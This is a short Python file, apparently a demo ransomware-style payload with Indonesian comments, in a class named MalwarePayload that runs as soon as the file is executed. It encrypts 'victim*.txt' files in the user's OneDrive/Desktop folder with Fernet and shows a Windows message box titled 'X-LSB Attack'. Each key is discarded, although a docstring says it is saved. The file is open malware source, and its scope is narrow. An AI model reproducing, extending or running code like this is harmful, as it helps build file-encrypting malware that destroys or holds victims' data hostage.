import os
import ctypes
import pathlib
from cryptography.fernet import Fernet

class MalwarePayload:
    def __init__(self):
        self.target_path = "OneDrive/Desktop"
        self.target_name = "victim"
        self.target_type = ".txt"
    
    def generate_key(self):
        """Membuat dan menyimpan key enkripsi ke file."""
        key = Fernet.generate_key()
        return key
    
    def get_victim_path(self, target_path="Desktop"):
        vPath = pathlib.Path.home() / target_path
        vPath.mkdir(parents=True, exist_ok=True)
        return vPath
    
    def list_victim_file(self, victim_path=None):
        list_file = list(victim_path.iterdir())
        list_file_enc = []
        for file in list_file:
            list_file_enc.append(file.name)
        return list_file_enc
    
    def encrypt_file(self, file_path, file_name):
        """Mengenkripsi isi file .txt dan menyimpannya sebagai file terenkripsi."""
        key = self.generate_key()
        fernet = Fernet(key)
        
        victim_file = file_path / file_name
        
        with open(victim_file , "rb") as file:
            original_data = file.read()
        
        encrypted_data = fernet.encrypt(original_data)
        
        encrypted_path = victim_file.with_suffix(victim_file.suffix + ".enc")
        with open(encrypted_path, "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)
            print(f"File terenkripsi disimpan sebagai: {encrypted_path}")
        
        ctypes.windll.user32.MessageBoxW(0, f"Ini malware,\\nfile {victim_file}\\ntelah dienkripsi, silahkan cek file\\n{encrypted_path}", "X-LSB Attack", 1)
    
    def run(self):
        victim_path = self.get_victim_path(self.target_path)
        file_of_path = self.list_victim_file(victim_path)
        
        victim_files = [f for f in file_of_path if f.startswith(self.target_name) and f.endswith(self.target_type)]
        for file in victim_files:
            print(file)
            self.encrypt_file(victim_path, file)

# Eksekusi
payload = MalwarePayload()
payload.run()